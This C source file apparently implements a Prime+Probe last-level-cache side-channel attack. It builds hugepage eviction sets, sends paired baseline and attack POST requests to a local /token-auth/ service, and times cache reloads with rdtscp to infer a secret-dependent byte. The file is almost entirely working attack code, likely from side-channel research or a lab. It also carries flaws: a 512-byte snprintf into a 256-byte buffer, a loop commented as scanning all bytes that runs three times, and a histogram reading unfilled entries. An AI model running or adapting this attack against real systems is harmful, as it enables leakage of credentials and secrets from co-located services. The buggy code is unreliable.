#include <stdio.h>
#include <stdint.h>

#include <x86intrin.h>
#include <fcntl.h>
#include <sys/mman.h>

#include "attacker.h"

#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

// LLC details
#define LLC_SETS 12288
#define LLC_WAYS 16
#define LLC_SIZE (LLC_WAYS * LLC_SETS * LINE_SIZE)
#define HUGE_PAGE_SIZE (2 * 1024 * 1024) // 2mb

// prime+probe
#define ATTACK_RUNS 10000
#define EVICTION_THRESHOLD 150 // L3 miss 
#define CACHE_STRIDE 4096
#define PROBE_SIZE (512 * 1024 * 1024)//(256 * 1024 * 1024)// 256mb
#define PAGE_COUNT (PROBE_SIZE / HUGE_PAGE_SIZE)
#define MAX_TIME 500
#define SLICE_COUNT 6
// socket  volatile uint8_t tmp = *(volatile uint8_t *)curr; 
#define PORT 8080
#define INET "127.0.0.1"

int clientfd;

uint8_t *probe_head;

uint64_t c_threshold;

char buf[1024]= {0};
char attack_data[256];

int main(int argc, char* argv[]) {
    mlockall(MCL_CURRENT | MCL_FUTURE);
     // setup socket connection 
    struct sockaddr_in servaddr;
    open_socket(&clientfd, &servaddr);
    connect(clientfd, (struct sockaddr *)&servaddr, sizeof(servaddr));

    // allocate mem to probe_head
    probe_arr_setup();
    //printf("Probe array base address: %p\n", (void*)probe_head);
    // threshold for classifying cache miss
    c_threshold = EVICTION_THRESHOLD;

    char *baseline_data = 
    "POST /token-auth/ HTTP/1.1\r\n"
    "Host: 127.0.0.1\r\n"
    "Content-Length: 35\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Connection: keep-alive\r\n"
    "\r\n"
    "username=none&password=none&id=0000";
    
    get_inputs(attack_data, argc, argv);
    
    int max = 0;
    uint8_t spiking_byte;

    int byte_diff[256] = {0};

    uint8_t target_byte = strtoul(argv[2], NULL, 0);//(uint8_t)i;

    node_t *slice_sets[SLICE_COUNT];
    build_dummy_slice_sets(target_byte, slice_sets);
    printf("\npress ENTER to execute attack with eviction set\n");
    getchar();  // waits for the user to press enter
    for (int i = 0; i < 3; i++){ // from byte 0x00 - 0xFF
        int total_diff  = 0;
       
        printf("\n===== EVICTION COUNT FOR BYTE %x =====\n", target_byte);
 
        for (int s = 0; s < SLICE_COUNT; s++){
            int total_slice_diff = 0;
            printf("\nRUNNING WITH SLICE %d SET\n", s);
            node_t *probe_arr = slice_sets[s];
            for (int r = 0; r < 3; r++){
                int baseline_count = 0;
                int attack_count = 0;
                for (int j = 0; j < ATTACK_RUNS; j++) {
                    //PRIME
                    prime_cache(probe_arr);
                    _mm_lfence();
                    // BASELINE
                    send(clientfd, baseline_data, strlen(baseline_data), 0);
                    recv(clientfd, buf, sizeof(buf), 0); 

                    //PROBE
                    check_cache_presence(probe_arr, &baseline_count);
                    _mm_lfence();

                    // = ATTACK =
                    //PRIME
                    prime_cache(probe_arr);
                     
                    // ATTACK
                    send(clientfd, attack_data, strlen(attack_data), 0);
                    recv(clientfd, buf, sizeof(buf), 0);

                    //PROBE
                    check_cache_presence(probe_arr, &attack_count);
                    _mm_lfence();
                } 
                
                int diff = attack_count - baseline_count;            
                if(diff > 0){
                    total_diff += diff;
                    total_slice_diff += diff;
                    printf("ATTACK RUN %d\n- DIFF: %d (ATTACK: %d misses, BASELINE: %d misses)\n",r ,diff, attack_count, baseline_count);
                    //printf("threshold used: %ld\n", c_threshold);
                }
            }
            printf("TOTAL SLICE DIFF (%d)\n", total_slice_diff);
        }
        printf("===== TOTAL DIFF (%d) =====\n", total_diff);
        byte_diff[i] = total_diff;
        if (total_diff > max){
            max = total_diff;
            spiking_byte = target_byte;
        }
        usleep(0);
    }   
    //byte_histogram(byte_diff);
    printf("\nLargest Spike Byte: %x (%d)\n", spiking_byte, max);

    close(clientfd);
    return 0;

}

// takes in a byte and builds up an array of pointers(addresses) to prime+probe associated with that byte
void probe_arr_setup(){
    // allocates mem for probe space (pointer chain)
    probe_head = mmap(NULL, PROBE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0); // allocate 512mb in RAM using hugetlb size pages (2MB)
    if (probe_head == MAP_FAILED) {
        perror("mmap failed - use sudo sysctl -w vm.nr_hugepages=256");
        exit(1);
    }
    memset(probe_head, 1, PROBE_SIZE); // make OS give physical ram 
}

// builds an array of pinters for each set associated with a uniqe slice
void build_dummy_slice_sets(uint8_t target_byte, node_t **slice_sets){
    // find addresses associated with the byte
    size_t byte_offset = CACHE_STRIDE * target_byte;

    node_t *byte_addresses[PAGE_COUNT] = {(node_t *)NULL};


    // loop for each page and get addresses for that byte#
    for (int p = 0; p < PAGE_COUNT; p++) {
        node_t *addr = (node_t *)(probe_head + (p * HUGE_PAGE_SIZE) + byte_offset);
        byte_addresses[p] = addr;
    }

    for (int s = 0; s < 6; s++) {
        node_t *slice_addresses[16];
        int addr_count = 0;
        while (addr_count < 16){
            int idx = rand() % PAGE_COUNT;
            if (byte_addresses[idx] != NULL){
                slice_addresses[addr_count] = byte_addresses[idx];
                addr_count ++;
                byte_addresses[idx] = NULL;
            }
        }
        for (int i = 0; i < addr_count - 1; i++){
            slice_addresses[i]->next = slice_addresses[i+1];
        }
        slice_addresses[addr_count - 1]->next = NULL;
        slice_sets[s] = slice_addresses[0];
        printf("FOUND NEW SLICE SET - SLICE %d\n", s);
    }
}



// Prime LLC
static inline __attribute__((always_inline)) void prime_cache(node_t *base_ptr){
    // loops through pointer array for a byte 8 times
    for(int i = 0; i < 8; i++){
        node_t *current = base_ptr;
        while (current != NULL){
            volatile uint8_t tmp = *(volatile uint8_t *)current;
            current = current->next;
        }
    }
    _mm_mfence();
}

static inline __attribute__((always_inline)) void check_cache_presence(node_t *base_ptr, int *result){
    unsigned int pid;
    node_t *current = base_ptr;
    int evictions = 0;
    
    while (current != NULL){
        _mm_lfence();
        uint64_t t1 = __rdtscp(&pid);
        _mm_lfence();

        volatile uint8_t tmp = *(volatile uint8_t *)current;

        _mm_lfence();
        uint64_t t2 = __rdtscp(&pid);
        _mm_lfence();

        if ((t2 - t1) > c_threshold && (t2 - t1) < MAX_TIME){
            evictions++;
        }
        current = current->next;
    }
    
    (*result) += evictions;
}


void get_inputs(char attack_data[], int argc, char* argv[]){
    char *attack_id;
    if (argc >= 2){
        attack_id = argv[1]; 
    }else{
        printf("No Attack ID Entered\n");
        exit(1);
    }
    char body[128];
    int body_len = snprintf(body, sizeof(body), "username=none&password=none&id=%s", attack_id);

    snprintf(attack_data, 512, 
        "POST /token-auth/ HTTP/1.1\r\n"
        "Host: 127.0.0.1\r\n"
        "Content-Length: %d\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Connection: keep-alive\r\n\r\n"
        "%s", body_len, body);
}

void open_socket(int *clientfd, struct sockaddr_in *servaddr){
    
    *clientfd = socket(AF_INET, SOCK_STREAM, 0);

    //int flags = fcntl(*clientfd, F_GETFL, 0);
    //fcntl(*clientfd, F_SETFL, flags | O_NONBLOCK);

    servaddr->sin_family = AF_INET;
    servaddr->sin_port = htons(PORT);
    servaddr->sin_addr.s_addr = inet_addr(INET);
}


void shuffle(node_t **items, int item_count){
    for(int i = item_count - 1; i > 0; i--){
        node_t *tmp = items[i];
        int shuffle_index = rand() % (i+1);
        // swap
        items[i] = items[shuffle_index];
        items[shuffle_index] = tmp;
    }
}

void byte_histogram(int *byte_diffs){
    printf("\n========== CACHE HIT HISTOGRAM ==========\n");
    for (int i = 67; i < 70; i++){ 
        int noBars = byte_diffs[i]/20;
        printf("0x%02x | ", i);
        for (int k = 0; k < noBars; k++) {
            printf("|");
        }
        printf(" (%d)\n", byte_diffs[i]);
    }
    printf("=========================================\n");
}